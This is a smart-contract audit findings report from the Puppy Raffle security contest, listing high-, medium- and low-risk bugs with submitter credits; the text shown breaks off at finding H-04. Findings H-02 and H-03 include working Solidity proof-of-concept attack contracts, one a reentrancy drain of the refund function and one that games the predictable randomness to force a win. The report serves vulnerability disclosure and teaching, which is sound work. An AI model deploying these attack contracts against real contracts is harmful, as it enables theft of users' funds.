# First Flight #2: Puppy Raffle - Findings Report

# Table of contents

- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
  - [H-01. Potential Loss of Funds During Prize Pool Distribution](#H-01)
  - [H-02. Reentrancy Vulnerability In refund() function ](#H-02)
  - [H-03. Randomness can be gamed](#H-03)
  - [H-04. `PuppyRaffle::refund` replaces an index with address(0) which can cause the function `PuppyRaffle::selectWinner` to always revert](#H-04)
  - [H-05. Typecasting from uint256 to uint64 in PuppyRaffle.selectWinner() May Lead to Overflow and Incorrect Fee Calculation](#H-05)
  - [H-06. Overflow/Underflow vulnerabilty for any version before 0.8.0](#H-06)
  - [H-07. Potential Front-Running Attack in `selectWinner` and `refund` Functions](#H-07)
- ## Medium Risk Findings
  - [M-01. `PuppyRaffle: enterRaffle` Use of gas extensive duplicate check leads to Denial of Service, making subsequent participants to spend much more gas than prev ones to enter](#M-01)
  - [M-02. Slightly increasing puppyraffle's contract balance will render `withdrawFees` function useless](#M-02)
  - [M-03. Impossible to win raffle if the winner is a smart contract without a fallback function](#M-03)
- ## Low Risk Findings
  - [L-01. Ambiguous index returned from PuppyRaffle::getActivePlayerIndex(address), leading to possible refund failures](#L-01)
  - [L-02. Missing `WinnerSelected`/`FeesWithdrawn` event emition in `PuppyRaffle::selectWinner`/`PuppyRaffle::withdrawFees` methods](#L-02)
  - [L-03. Participants are mislead by the rarity chances.](#L-03)
  - [L-04. PuppyRaffle::selectWinner() - L126: should use `>` instead of `>=`, because `raffleStartTime + raffleDuration` still represents an active raffle.](#L-04)
  - [L-05. Total entrance fee can overflow leading to the user paying little to nothing](#L-05)
  - [L-06. Fee should be 'totalAmountCollected-prizePool' to prevent decimal loss](#L-06)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #2

### Dates: Oct 25th, 2023 - Nov 1st, 2023

[See more contest details here](https://codehawks.cyfrin.io/c/2023-10-Puppy-Raffle)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 7
- Medium: 3
- Low: 6

# High Risk Findings

## <a id='H-01'></a>H-01. Potential Loss of Funds During Prize Pool Distribution

_Submitted by [0xethanol](https://profiles.cyfrin.io/u/undefined), [efecarranza](https://profiles.cyfrin.io/u/undefined), [shikhar229169](https://profiles.cyfrin.io/u/undefined), [happyformerlawyer](https://profiles.cyfrin.io/u/undefined), [zach030](https://profiles.cyfrin.io/u/undefined), [funkornaut](https://profiles.cyfrin.io/u/undefined), [cem](https://profiles.cyfrin.io/u/undefined), [0xbjorn](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [0xaraj](https://profiles.cyfrin.io/u/undefined), [0x6a70](https://profiles.cyfrin.io/u/undefined), [merlinboii](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [ararara](https://profiles.cyfrin.io/u/undefined), [sandman](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [0xWalle](https://profiles.cyfrin.io/u/undefined), [rapstyle](https://profiles.cyfrin.io/u/undefined), [n4thedev01](https://profiles.cyfrin.io/u/undefined), [Eric](https://profiles.cyfrin.io/u/undefined), [theirrationalone](https://profiles.cyfrin.io/u/undefined), [ThermoHash](https://profiles.cyfrin.io/u/undefined), [naman1729](https://profiles.cyfrin.io/u/undefined), [luka](https://profiles.cyfrin.io/u/undefined), [asimaranov](https://profiles.cyfrin.io/u/undefined), [wallebach](https://profiles.cyfrin.io/u/undefined), [pacelli](https://profiles.cyfrin.io/u/undefined), [danielvo102](https://profiles.cyfrin.io/u/undefined), [y0ng0p3](https://profiles.cyfrin.io/u/undefined), [priker](https://profiles.cyfrin.io/u/undefined), [dentonylifer](https://profiles.cyfrin.io/u/undefined), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj), [ryonen](https://profiles.cyfrin.io/u/undefined), [ivanfitro](https://profiles.cyfrin.io/u/undefined), [intellygentle](https://profiles.cyfrin.io/u/undefined), [davide](https://profiles.cyfrin.io/u/undefined), [elser17](https://profiles.cyfrin.io/u/undefined), [yeahchibyke](https://profiles.cyfrin.io/u/undefined), [zhuying](https://profiles.cyfrin.io/u/undefined), [Marcologonz](https://profiles.cyfrin.io/u/undefined), [0xspryon](https://profiles.cyfrin.io/u/undefined), [krisrenzo](https://profiles.cyfrin.io/u/undefined), [maroutis](https://profiles.cyfrin.io/u/undefined), [0xrochimaru](https://profiles.cyfrin.io/u/undefined), [TheCodingCanuck](https://profiles.cyfrin.io/u/undefined), [Leogold](https://profiles.cyfrin.io/u/undefined), [blocktivist](https://profiles.cyfrin.io/u/undefined), [ezerez](https://profiles.cyfrin.io/u/undefined), [n0kto](https://profiles.cyfrin.io/u/undefined), [kumar](https://profiles.cyfrin.io/u/undefined), [0xouooo](https://profiles.cyfrin.io/u/undefined), [zxarcs](https://profiles.cyfrin.io/u/undefined), [benbo](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [uint256vieet](https://profiles.cyfrin.io/u/undefined), [innertia](https://profiles.cyfrin.io/u/undefined), [WangSecurity](https://profiles.cyfrin.io/u/undefined), [coffee](https://profiles.cyfrin.io/u/undefined), [iLoveMiaGoth](https://profiles.cyfrin.io/u/undefined), [0xswahili](https://profiles.cyfrin.io/u/undefined), [emanherawy](https://profiles.cyfrin.io/u/undefined), [Nocturnus](https://profiles.cyfrin.io/u/undefined), [pratred](https://profiles.cyfrin.io/u/undefined), [silvana](https://profiles.cyfrin.io/u/undefined), [Bigor](https://profiles.cyfrin.io/u/undefined), [remedcu](https://profiles.cyfrin.io/u/undefined), [kose](https://profiles.cyfrin.io/u/undefined), [0xlemon](https://profiles.cyfrin.io/u/undefined), [equious](https://profiles.cyfrin.io/u/undefined), [cromewar](https://profiles.cyfrin.io/u/undefined), [Heba](https://profiles.cyfrin.io/u/undefined), [0xlouistsai](https://profiles.cyfrin.io/u/undefined), [printfjoby](https://profiles.cyfrin.io/u/undefined), [ciaranightingale](https://profiles.cyfrin.io/u/undefined), [jasmine](https://profiles.cyfrin.io/u/undefined), [hueber](https://profiles.cyfrin.io/u/undefined), [0x0bserver](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L125-L154

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L103

## Summary

In the `selectWinner` function, when a player has refunded and their address is replaced with address(0), the prize money may be sent to address(0), resulting in fund loss.

## Vulnerability Details

In the `refund` function if a user wants to refund his money then he will be given his money back and his address in the array will be replaced with `address(0)`. So lets say `Alice` entered in the raffle and later decided to refund her money then her address in the `player` array will be replaced with `address(0)`. And lets consider that her index in the array is `7th` so currently there is `address(0)` at `7th index`, so when `selectWinner` function will be called there isn't any kind of check that this 7th index can't be the winner so if this `7th` index will be declared as winner then all the prize will be sent to him which will actually lost as it will be sent to `address(0)`

## Impact

Loss of funds if they are sent to address(0), posing a financial risk.

## Tools Used

Manual Review

## Recommendations

Implement additional checks in the `selectWinner` function to ensure that prize money is not sent to `address(0)`

## <a id='H-02'></a>H-02. Reentrancy Vulnerability In refund() function

_Submitted by [philfr](https://profiles.cyfrin.io/u/undefined), [djanerch](https://profiles.cyfrin.io/u/undefined), [0xouooo](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [funkornaut](https://profiles.cyfrin.io/u/undefined), [cem](https://profiles.cyfrin.io/u/undefined), [0xbjorn](https://profiles.cyfrin.io/u/undefined), [zac369](https://profiles.cyfrin.io/u/undefined), [jerseyjoewalcott](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [alsirang](https://profiles.cyfrin.io/u/undefined), [happyformerlawyer](https://profiles.cyfrin.io/u/undefined), [0xgd](https://profiles.cyfrin.io/u/undefined), [darksnow](https://profiles.cyfrin.io/u/undefined), [0xLuke4G1](https://profiles.cyfrin.io/u/undefined), [SALUTEMADA](https://profiles.cyfrin.io/u/undefined), [robbiesumner](https://profiles.cyfrin.io/u/undefined), [cosine](https://profiles.cyfrin.io/u/undefined), [0xethanol](https://profiles.cyfrin.io/u/undefined), [pacelli](https://profiles.cyfrin.io/u/undefined), [zadev](https://profiles.cyfrin.io/u/undefined), [ararara](https://profiles.cyfrin.io/u/undefined), [0x0noob](https://profiles.cyfrin.io/u/undefined), [ret2basic](https://profiles.cyfrin.io/u/undefined), [sandman](https://profiles.cyfrin.io/u/undefined), [tinotendajoe01](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [anjalit](https://profiles.cyfrin.io/u/undefined), [C0D30](https://profiles.cyfrin.io/u/undefined), [theirrationalone](https://profiles.cyfrin.io/u/undefined), [anarcheuz](https://profiles.cyfrin.io/u/undefined), [Eric](https://profiles.cyfrin.io/u/undefined), [luka](https://profiles.cyfrin.io/u/undefined), [charalab0ts](https://profiles.cyfrin.io/u/undefined), [n4thedev01](https://profiles.cyfrin.io/u/undefined), [dcheng](https://profiles.cyfrin.io/u/undefined), [Omeguhh](https://profiles.cyfrin.io/u/undefined), [shikhar229169](https://profiles.cyfrin.io/u/undefined), [intellygentle](https://profiles.cyfrin.io/u/undefined), [0xfuluz](https://profiles.cyfrin.io/u/undefined), [rapstyle](https://profiles.cyfrin.io/u/undefined), [asimaranov](https://profiles.cyfrin.io/u/undefined), [wallebach](https://profiles.cyfrin.io/u/undefined), [danlipert](https://profiles.cyfrin.io/u/undefined), [MSaptarshi007](https://profiles.cyfrin.io/u/undefined), [y0ng0p3](https://profiles.cyfrin.io/u/undefined), [Aitor](https://profiles.cyfrin.io/u/undefined), [priker](https://profiles.cyfrin.io/u/undefined), [abhishekthakur](https://profiles.cyfrin.io/u/undefined), [Chandr](https://profiles.cyfrin.io/u/undefined), [maanvad3r](https://profiles.cyfrin.io/u/undefined), [0xrex](https://profiles.cyfrin.io/u/undefined), [naman1729](https://profiles.cyfrin.io/u/undefined), [syahirAmali](https://profiles.cyfrin.io/u/undefined), [irondevx](https://profiles.cyfrin.io/u/undefined), [0xnilesh](https://profiles.cyfrin.io/u/undefined), [ryonen](https://profiles.cyfrin.io/u/undefined), [0x4non](https://profiles.cyfrin.io/u/undefined), [dougo](https://profiles.cyfrin.io/u/undefined), [ivanfitro](https://profiles.cyfrin.io/u/undefined), [BowTiedJerboa](https://profiles.cyfrin.io/u/undefined), [DuncanDuMond](https://profiles.cyfrin.io/u/undefined), [zuhaibmohd](https://profiles.cyfrin.io/u/undefined), [0xtekt](https://profiles.cyfrin.io/u/undefined), [Osora9](https://profiles.cyfrin.io/u/undefined), [aethrouzz](https://profiles.cyfrin.io/u/undefined), [Marcologonz](https://profiles.cyfrin.io/u/undefined), [0xspryon](https://profiles.cyfrin.io/u/undefined), [krisrenzo](https://profiles.cyfrin.io/u/undefined), [stakog](https://profiles.cyfrin.io/u/undefined), [0xdark1337](https://profiles.cyfrin.io/u/undefined), [0xdangit](https://profiles.cyfrin.io/u/undefined), [crypt0mate](https://profiles.cyfrin.io/u/undefined), [mibiot13](https://profiles.cyfrin.io/u/undefined), [Leogold](https://profiles.cyfrin.io/u/undefined), [0xswahili](https://profiles.cyfrin.io/u/undefined), [Oozman](https://profiles.cyfrin.io/u/undefined), [zen4269](https://profiles.cyfrin.io/u/undefined), [blocktivist](https://profiles.cyfrin.io/u/undefined), [ezerez](https://profiles.cyfrin.io/u/undefined), [0xsagetony](https://profiles.cyfrin.io/u/undefined), [zxarcs](https://profiles.cyfrin.io/u/undefined), [bube](https://profiles.cyfrin.io/u/undefined), [n0kto](https://profiles.cyfrin.io/u/undefined), [sm4rty](https://profiles.cyfrin.io/u/undefined), [David77](https://profiles.cyfrin.io/u/undefined), [0xKriLuv](https://profiles.cyfrin.io/u/undefined), [contractsecure](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [Zurriken](https://profiles.cyfrin.io/u/undefined), [innertia](https://profiles.cyfrin.io/u/undefined), [WangSecurity](https://profiles.cyfrin.io/u/undefined), [0xrochimaru](https://profiles.cyfrin.io/u/undefined), [0xSimeon](https://profiles.cyfrin.io/u/undefined), [iLoveMiaGoth](https://profiles.cyfrin.io/u/undefined), [ironcladmerc](https://profiles.cyfrin.io/u/undefined), [Awacs](https://profiles.cyfrin.io/u/undefined), [emanherawy](https://profiles.cyfrin.io/u/undefined), [firmanregar](https://profiles.cyfrin.io/u/undefined), [00decree](https://profiles.cyfrin.io/u/undefined), [Nocturnus](https://profiles.cyfrin.io/u/undefined), [silvana](https://profiles.cyfrin.io/u/undefined), [hueber](https://profiles.cyfrin.io/u/undefined), [0xJimbo](https://profiles.cyfrin.io/u/undefined), [kose](https://profiles.cyfrin.io/u/undefined), [Dutch](https://profiles.cyfrin.io/u/undefined), [denzi](https://profiles.cyfrin.io/u/undefined), [0xlouistsai](https://profiles.cyfrin.io/u/undefined), [ETHANHUNTIMF99](https://profiles.cyfrin.io/u/undefined), [0xjarix](https://profiles.cyfrin.io/u/undefined), [0xhashiman](https://profiles.cyfrin.io/u/undefined), [ciaranightingale](https://profiles.cyfrin.io/u/undefined), [Heba](https://profiles.cyfrin.io/u/undefined), [codyx](https://profiles.cyfrin.io/u/undefined), [musashi](https://profiles.cyfrin.io/u/undefined), [0x0bserver](https://profiles.cyfrin.io/u/undefined). Selected submission by: [charalab0ts](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L96C4-L105C6

## Summary

The `PuppyRaffle::refund()` function doesn't have any mechanism to prevent a reentrancy attack and doesn't follow the Check-effects-interactions pattern

## Vulnerability Details

```javascript
function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

In the provided PuppyRaffle contract is potentially vulnerable to reentrancy attacks. This is because it first sends Ether to msg.sender and then updates the state of the contract.a malicious contract could re-enter the refund function before the state is updated.

## Impact

If exploited, this vulnerability could allow a malicious contract to drain Ether from the PuppyRaffle contract, leading to loss of funds for the contract and its users.

```javascript
PuppyRaffle.players (src/PuppyRaffle.sol#23) can be used in cross function reentrancies:
- PuppyRaffle.enterRaffle(address[]) (src/PuppyRaffle.sol#79-92)
- PuppyRaffle.getActivePlayerIndex(address) (src/PuppyRaffle.sol#110-117)
- PuppyRaffle.players (src/PuppyRaffle.sol#23)
- PuppyRaffle.refund(uint256) (src/PuppyRaffle.sol#96-105)
- PuppyRaffle.selectWinner() (src/PuppyRaffle.sol#125-154)
```

## POC

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./PuppyRaffle.sol";

contract AttackContract {
    PuppyRaffle public puppyRaffle;
    uint256 public receivedEther;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function attack() public payable {
        require(msg.value > 0);

        // Create a dynamic array and push the sender's address
        address[] memory players = new address[](1);
        players[0] = address(this);

        puppyRaffle.enterRaffle{value: msg.value}(players);
    }

    fallback() external payable {
        if (address(puppyRaffle).balance >= msg.value) {
            receivedEther += msg.value;

            // Find the index of the sender's address
            uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));

            if (playerIndex > 0) {
                // Refund the sender if they are in the raffle
                puppyRaffle.refund(playerIndex);
            }
        }
    }
}
```

we create a malicious contract (AttackContract) that enters the raffle and then uses its fallback function to repeatedly call refund before the PuppyRaffle contract has a chance to update its state.

</details>

## Tools Used

Manual Review

## Recommendations

To mitigate the reentrancy vulnerability, you should follow the Checks-Effects-Interactions pattern. This pattern suggests that you should make any state changes before calling external contracts or sending Ether.

Here's how you can modify the refund function:

```javascript
function refund(uint256 playerIndex) public {
address playerAddress = players[playerIndex];
require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

// Update the state before sending Ether
players[playerIndex] = address(0);
emit RaffleRefunded(playerAddress);

// Now it's safe to send Ether
(bool success, ) = payable(msg.sender).call{value: entranceFee}("");
require(success, "PuppyRaffle: Failed to refund");


}
```

This way, even if the msg.sender is a malicious contract that tries to re-enter the refund function, it will fail the require check because the player's address has already been set to address(0).Also we changed the event is emitted before the external call, and the external call is the last step in the function. This mitigates the risk of a reentrancy attack.

## <a id='H-03'></a>H-03. Randomness can be gamed

_Submitted by [philfr](https://profiles.cyfrin.io/u/undefined), [0xethanol](https://profiles.cyfrin.io/u/undefined), [0xLuke4G1](https://profiles.cyfrin.io/u/undefined), [0xouooo](https://profiles.cyfrin.io/u/undefined), [whiteh4t9527](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [happyformerlawyer](https://profiles.cyfrin.io/u/undefined), [efecarranza](https://profiles.cyfrin.io/u/undefined), [cem](https://profiles.cyfrin.io/u/undefined), [zac369](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [anjalit](https://profiles.cyfrin.io/u/undefined), [darksnow](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [0x6a70](https://profiles.cyfrin.io/u/undefined), [rapstyle](https://profiles.cyfrin.io/u/undefined), [cosine](https://profiles.cyfrin.io/u/undefined), [zadev](https://profiles.cyfrin.io/u/undefined), [eeshenggoh](https://profiles.cyfrin.io/u/undefined), [merlinboii](https://profiles.cyfrin.io/u/undefined), [0xaraj](https://profiles.cyfrin.io/u/undefined), [ret2basic](https://profiles.cyfrin.io/u/undefined), [0x0noob](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [tinotendajoe01](https://profiles.cyfrin.io/u/undefined), [0xWalle](https://profiles.cyfrin.io/u/undefined), [C0D30](https://profiles.cyfrin.io/u/undefined), [anarcheuz](https://profiles.cyfrin.io/u/undefined), [0xswahili](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [ThermoHash](https://profiles.cyfrin.io/u/undefined), [pacelli](https://profiles.cyfrin.io/u/undefined), [sandman](https://profiles.cyfrin.io/u/undefined), [wallebach](https://profiles.cyfrin.io/u/undefined), [mahivasisth](https://profiles.cyfrin.io/u/undefined), [icebear](https://profiles.cyfrin.io/u/undefined), [luka](https://profiles.cyfrin.io/u/undefined), [slasheur](https://profiles.cyfrin.io/u/undefined), [banditxbt](https://profiles.cyfrin.io/u/undefined), [SaudxInu](https://profiles.cyfrin.io/u/undefined), [asimaranov](https://profiles.cyfrin.io/u/undefined), [danlipert](https://profiles.cyfrin.io/u/undefined), [y0ng0p3](https://profiles.cyfrin.io/u/undefined), [Aitor](https://profiles.cyfrin.io/u/undefined), [priker](https://profiles.cyfrin.io/u/undefined), [Chandr](https://profiles.cyfrin.io/u/undefined), [dougo](https://profiles.cyfrin.io/u/undefined), [maanvad3r](https://profiles.cyfrin.io/u/undefined), [silverwind](https://profiles.cyfrin.io/u/undefined), [dentonylifer](https://profiles.cyfrin.io/u/undefined), [0xtheblackpanther](https://profiles.cyfrin.io/u/undefined), [irondevx](https://profiles.cyfrin.io/u/undefined), [ryonen](https://profiles.cyfrin.io/u/undefined), [0xVinylDavyl](https://profiles.cyfrin.io/u/undefined), [0x4non](https://profiles.cyfrin.io/u/undefined), [kiteweb3](https://profiles.cyfrin.io/u/undefined), [ararara](https://profiles.cyfrin.io/u/undefined), [elser17](https://profiles.cyfrin.io/u/undefined), [naman1729](https://profiles.cyfrin.io/u/undefined), [DuncanDuMond](https://profiles.cyfrin.io/u/undefined), [abhishekthakur](https://profiles.cyfrin.io/u/undefined), [syahirAmali](https://profiles.cyfrin.io/u/undefined), [zuhaibmohd](https://profiles.cyfrin.io/u/undefined), [AnouarBF](https://profiles.cyfrin.io/u/undefined), [Marcologonz](https://profiles.cyfrin.io/u/undefined), [krisrenzo](https://profiles.cyfrin.io/u/undefined), [aethrouzz](https://profiles.cyfrin.io/u/undefined), [zhuying](https://profiles.cyfrin.io/u/undefined), [0xspryon](https://profiles.cyfrin.io/u/undefined), [maroutis](https://profiles.cyfrin.io/u/undefined), [0xdark1337](https://profiles.cyfrin.io/u/undefined), [ro1sharkm](https://profiles.cyfrin.io/u/undefined), [Osora9](https://profiles.cyfrin.io/u/undefined), [0xrex](https://profiles.cyfrin.io/u/undefined), [0xnilesh](https://profiles.cyfrin.io/u/undefined), [zen4269](https://profiles.cyfrin.io/u/undefined), [zxarcs](https://profiles.cyfrin.io/u/undefined), [bube](https://profiles.cyfrin.io/u/undefined), [blocktivist](https://profiles.cyfrin.io/u/undefined), [kumar](https://profiles.cyfrin.io/u/undefined), [n0kto](https://profiles.cyfrin.io/u/undefined), [sh0lt0](https://profiles.cyfrin.io/u/undefined), [sm4rty](https://profiles.cyfrin.io/u/undefined), [NeoRusI](https://profiles.cyfrin.io/u/undefined), [ugrru](https://profiles.cyfrin.io/u/undefined), [theinstructor](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [dcheng](https://profiles.cyfrin.io/u/undefined), [0xsagetony](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [benbo](https://profiles.cyfrin.io/u/undefined), [0xMUSA1337](https://profiles.cyfrin.io/u/undefined), [innertia](https://profiles.cyfrin.io/u/undefined), [coffee](https://profiles.cyfrin.io/u/undefined), [0xtekt](https://profiles.cyfrin.io/u/undefined), [MikeDougherty](https://profiles.cyfrin.io/u/undefined), [ironcladmerc](https://profiles.cyfrin.io/u/undefined), [iLoveMiaGoth](https://profiles.cyfrin.io/u/undefined), [Awacs](https://profiles.cyfrin.io/u/undefined), [EchoSpr](https://profiles.cyfrin.io/u/undefined), [0xabhayy](https://profiles.cyfrin.io/u/undefined), [firmanregar](https://profiles.cyfrin.io/u/undefined), [emanherawy](https://profiles.cyfrin.io/u/undefined), [pratred](https://profiles.cyfrin.io/u/undefined), [Nocturnus](https://profiles.cyfrin.io/u/undefined), [denzi](https://profiles.cyfrin.io/u/undefined), [remedcu](https://profiles.cyfrin.io/u/undefined), [Dutch](https://profiles.cyfrin.io/u/undefined), [equious](https://profiles.cyfrin.io/u/undefined), [0xJimbo](https://profiles.cyfrin.io/u/undefined), [0xlemon](https://profiles.cyfrin.io/u/undefined), [ciaranightingale](https://profiles.cyfrin.io/u/undefined), [kose](https://profiles.cyfrin.io/u/undefined), [silvana](https://profiles.cyfrin.io/u/undefined), [hueber](https://profiles.cyfrin.io/u/undefined), [ezerez](https://profiles.cyfrin.io/u/undefined), [Oozman](https://profiles.cyfrin.io/u/undefined), [harpaljadeja](https://profiles.cyfrin.io/u/undefined), [musashi](https://profiles.cyfrin.io/u/undefined), [robbiesumner](https://profiles.cyfrin.io/u/undefined), [damoklov](https://profiles.cyfrin.io/u/undefined), [cromewar](https://profiles.cyfrin.io/u/undefined), [printfjoby](https://profiles.cyfrin.io/u/undefined), [0xhashiman](https://profiles.cyfrin.io/u/undefined), [0xth30r3m](https://profiles.cyfrin.io/u/undefined), [codyx](https://profiles.cyfrin.io/u/undefined), [Leogold](https://profiles.cyfrin.io/u/undefined), [0xlouistsai](https://profiles.cyfrin.io/u/undefined), [davide](https://profiles.cyfrin.io/u/undefined), [0x0bserver](https://profiles.cyfrin.io/u/undefined). Selected submission by: [efecarranza](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/main/src/PuppyRaffle.sol#L128

## Summary

The randomness to select a winner can be gamed and an attacker can be chosen as winner without random element.

## Vulnerability Details

Because all the variables to get a random winner on the contract are blockchain variables and are known, a malicious actor can use a smart contract to game the system and receive all funds and the NFT.

## Impact

Critical

## Tools Used

Foundry

## POC

```javascript
// SPDX-License-Identifier: No-License

pragma solidity 0.7.6;

interface IPuppyRaffle {
    function enterRaffle(address[] memory newPlayers) external payable;

    function getPlayersLength() external view returns (uint256);

    function selectWinner() external;
}

contract Attack {
    IPuppyRaffle raffle;

    constructor(address puppy) {
        raffle = IPuppyRaffle(puppy);
    }

    function attackRandomness() public {
        uint256 playersLength = raffle.getPlayersLength();

        uint256 winnerIndex;
        uint256 toAdd = playersLength;
        while (true) {
            winnerIndex =
                uint256(
                    keccak256(
                        abi.encodePacked(
                            address(this),
                            block.timestamp,
                            block.difficulty
                        )
                    )
                ) %
                toAdd;

            if (winnerIndex == playersLength) break;
            ++toAdd;
        }
        uint256 toLoop = toAdd - playersLength;

        address[] memory playersToAdd = new address[](toLoop);
        playersToAdd[0] = address(this);

        for (uint256 i = 1; i < toLoop; ++i) {
            playersToAdd[i] = address(i + 100);
        }

        uint256 valueToSend = 1e18 * toLoop;
        raffle.enterRaffle{value: valueToSend}(playersToAdd);
        raffle.selectWinner();
    }

    receive() external payable {}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
```

## Recommendations

Use Chainlink's VRF to generate a random number to select the winner. Patrick will be proud.

## <a id='H-04'></a>H-04. `PuppyRaffle::refund` replaces an index with address(0) which can cause the function `PuppyRaffle::selectWinner` to always revert

_Submitted by [0xethanol](https://profiles.cyfrin.io/u/undefined), [efecarranza](https://profiles.cyfrin.io/u/undefined), [shikhar229169](https://profiles.cyfrin.io/u/undefined), [happyformerlawyer](https://profiles.cyfrin.io/u/undefined), [zach030](https://profiles.cyfrin.io/u/undefined), [cem](https://profiles.cyfrin.io/u/undefined), [0xaraj](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [0x6a70](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [ararara](https://profiles.cyfrin.io/u/undefined), [sandman](https://profiles.cyfrin.io/u/undefined), [merlinboii](https://profiles.cyfrin.io/u/undefined), [nisedo](https://profiles.cyfrin.io/u/undefined), [0xWalle](https://profiles.cyfrin.io/u/undefined), [Eric](https://profiles.cyfrin.io/u/undefined), [ThermoHash](https://profiles.cyfrin.io/u/undefined), [naman1729](https://profiles.cyfrin.io/u/undefined), [luka](https://profiles.cyfrin.io/u/undefined), [asimaranov](https://profiles.cyfrin.io/u/undefined), [wallebach](https://profiles.cyfrin.io/u/undefined), [pacelli](https://profiles.cyfrin.io/u/undefined), [danielvo102](https://profiles.cyfrin.io/u/undefined), [priker](https://profiles.cyfrin.io/u/undefined), [dentonylifer](https://profiles.cyfrin.io/u/undefined), [ryonen](https://profiles.cyfrin.io/u/undefined), [ivanfitro](https://profiles.cyfrin.io/u/undefined), [davide](https://profiles.cyfrin.io/u/undefined), [elser17](https://profiles.cyfrin.io/u/undefined), [zhuying](https://profiles.cyfrin.io/u/undefined), [Marcologonz](https://profiles.cyfrin.io/u/undefined), [0xspryon](https://profiles.cyfrin.io/u/undefined), [krisrenzo](https://profiles.cyfrin.io/u/undefined), [maroutis](https://profiles.cyfrin.io/u/undefined), [0xrochimaru](https://profiles.cyfrin.io/u/undefined), [TheCodingCanuck](https://profiles.cyfrin.io/u/undefined), [Leogold](https://profiles.cyfrin.io/u/undefined), [blocktivist](https://profiles.cyfrin.io/u/undefined), [ezerez](https://profiles.cyfrin.io/u/undefined), [kumar](https://profiles.cyfrin.io/u/undefined), [0xouooo](https://profiles.cyfrin.io/u/undefined), [zxarcs](https://profiles.cyfrin.io/u/undefined), [benbo](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [uint256vieet](https://profiles.cyfrin.io/u/undefined), [innertia](https://profiles.cyfrin.io/u/undefined), [WangSecurity](https://profiles.cyfrin.io/u/undefined), [coffee](https://profiles.cyfrin.io/u/undefined), [iLoveMiaGoth](https://profiles.cyfrin.io/u/undefined), [0xswahili](https://profiles.cyfrin.io/u/undefined), [emanherawy](https://profiles.cyfrin.io/u/undefined), [Nocturnus](https://profiles.cyfrin.io/u/undefined), [pratred](https://profiles.cyfrin.io/u/undefined), [silvana](https://profiles.cyfrin.io/u/undefined), [kose](https://profiles.cyfrin.io/u/undefined), [0xlemon](https://profiles.cyfrin.io/u/undefined), [equious](https://profiles.cyfrin.io/u/undefined), [cromewar](https://profiles.cyfrin.io/u/undefined), [0xlouistsai](https://profiles.cyfrin.io/u/undefined), [printfjoby](https://profiles.cyfrin.io/u/undefined), [ciaranightingale](https://profiles.cyfrin.io/u/undefined), [jasmine](https://profiles.cyfrin.io/u/undefined), [Heba](https://profiles.cyfrin.io/u/undefined), [remedcu](https://profiles.cyfrin.io/u/undefined), [hueber](https://profiles.cyfrin.io/u/undefined), [0x0bserver](https://profiles.cyfrin.io/u/undefined). Selected submission by: [maroutis](https://profiles.cyfrin.io/u/undefined)._

### Relevant GitHub Links

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L103

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L131

